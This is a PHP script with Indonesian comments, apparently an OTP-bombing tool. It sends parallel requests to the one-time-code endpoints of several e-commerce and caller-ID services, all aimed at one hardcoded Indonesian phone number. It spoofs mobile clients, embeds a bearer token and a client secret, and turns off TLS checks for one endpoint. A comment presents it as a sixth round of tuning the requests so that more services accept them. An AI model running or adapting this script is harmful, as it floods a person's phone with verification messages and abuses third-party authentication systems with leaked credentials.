<?php
// Ronde 6: micro-probe perbaikan format buat yang hampir tembus
$UA = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/153.0.0.0 Mobile Safari/537.36';
$P = '6283822461998'; $L = '083822461998'; $N = '83822461998';
$R16 = bin2hex(random_bytes(8));

$JWT = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1dWlkIjoiN2JjZTk0N2QtZTMwOS00YjYyLTk1NWItZTJkNTMyNWVmY2U5IiwiaWF0IjoxNjYyMzczNjM2LCJpc3MiOiJ3YXBpLnJ1cGFydXBhIn0.FEO05D4v9bvaU-Kpgo4XvwbIWhbm3uamIDTCsRmm_Gs';

$REQS = [];
foreach (['+62' . $N, $P, '0' . $N] as $k => $ph) {
  $REQS[] = ['name' => 'ruparupa-ph' . $k, 'm' => 'POST', 'url' => 'https://wapi.ruparupa.com/auth/generate-otp',
    'h' => ['Content-Type: application/json', 'Accept: application/json', 'x-company-name: odi', 'user-platform: mobile',
            'x-frontend-type: mobile', 'authorization: ' . $JWT, 'Origin: https://m.ruparupa.com',
            'Referer: https://m.ruparupa.com/verification'],
    'b' => '{"phone":"' . $ph . '","action":"register","channel":"chat","email":"","token":"","customer_id":"0","is_resend":0}',
    'ua' => 'Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36'];
}
foreach (['IDN', '62', '+62'] as $k => $cc) {
  $REQS[] = ['name' => 'gokwik-cc' . $k, 'm' => 'POST', 'url' => 'https://gkx.gokwik.co/v4/auth/otp/login/trigger',
    'h' => ['Content-Type: application/json', 'Accept: application/json', 'gk-merchant-id: 101', 'gk-source: core',
            'gk-request-id: ' . $R16 . '-' . $k, 'Origin: https://pdp.gokwik.co', 'Referer: https://pdp.gokwik.co/'],
    'b' => '{"phone":"' . $N . '","country":"' . $cc . '"}'];
}
$REQS[] = ['name' => 'truecaller-min', 'm' => 'POST', 'url' => 'https://account-asia-south1.truecaller.com/v2/sendOnboardingOtp',
  'h' => ['Content-Type: application/json; charset=UTF-8', 'clientsecret: lvc22mp3l1sfv6ujg83rd17btt'],
  'b' => '{"dialingCode":"62","phoneNumber":"' . $N . '","requestType":2,"installationDetails":{"app":{"buildVersion":5,"majorVersion":11,"minorVersion":7,"store":"GOOGLE_PLAY"},"device":{"deviceId":"' . $R16 . '","language":"en","manufacturer":"samsung","model":"SM-A107F","osName":"Android","osVersion":"10","mobileServices":["GMS"]},"language":"en"}}',
  'ua' => 'Truecaller/11.75.5 (Android;10)'];

$REQS[] = ['name' => 'bocil-h1', 'm' => 'POST', 'url' => 'https://bocil.id/mobile/v1/miscallotp_request.php',
  'h' => ['Content-Type: application/x-www-form-urlencoded'], 'b' => 'user_id=&language=in&phone=' . $P . '&device_id=' . $R16 . '&retry=0',
  'ua' => 'okhttp/3.10.0', 'http11' => true];

$REQS[] = ['name' => 'jamtangan-noverify', 'm' => 'POST', 'url' => 'https://apiv2.jamtangan.com/validateuniqueid',
  'h' => ['Accept: application/json, text/plain, */*'], 'b' => 'params=' . $L . '&step=2&type=sms', 'noverify' => true];

$mh = curl_multi_init();
$cs = [];
foreach ($REQS as $i => $r) {
  $ch = curl_init();
  $hdrs = $r['h'];
  $hdrs[] = 'User-Agent: ' . ($r['ua'] ?? $UA);
  curl_setopt_array($ch, [CURLOPT_URL => $r['url'], CURLOPT_HTTPHEADER => $hdrs, CURLOPT_RETURNTRANSFER => true,
    CURLOPT_CONNECTTIMEOUT => 8, CURLOPT_TIMEOUT => 30, CURLOPT_FOLLOWLOCATION => true, CURLOPT_ENCODING => '',
    CURLOPT_CUSTOMREQUEST => $r['m'], CURLOPT_SSL_VERIFYPEER => empty($r['noverify']), CURLOPT_SSL_VERIFYHOST => empty($r['noverify']) ? 2 : 0]);
  if (!empty($r['http11'])) curl_setopt($ch, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_1);
  if ($r['m'] !== 'GET') curl_setopt($ch, CURLOPT_POSTFIELDS, $r['b']);
  curl_multi_add_handle($mh, $ch);
  $cs[$i] = $ch;
}
$running = null; $errs = [];
do {
  curl_multi_exec($mh, $running);
  while (($info = curl_multi_info_read($mh)) !== false) {
    $idx = array_search($info['handle'], $cs, true);
    if ($info['result'] !== CURLE_OK) $errs[$idx] = curl_strerror($info['result']);
  }
  curl_multi_select($mh, 1.0);
} while ($running > 0);

foreach ($REQS as $i => $r) {
  $ch = $cs[$i];
  $body = (string) curl_multi_getcontent($ch);
  $code = (int) curl_getinfo($ch, CURLINFO_HTTP_CODE);
  $flat = trim(preg_replace('/\s+/', ' ', $body));
  echo str_pad($r['name'], 22) . ' [' . ($code ?: '000') . '] ' . (isset($errs[$i]) ? 'GAGAL: ' . $errs[$i] : (substr($flat, 0, 230) !== '' ? substr($flat, 0, 230) : '(kosong)')) . "\n";
  curl_multi_remove_handle($mh, $ch);
}
curl_multi_close($mh);
echo "\n";
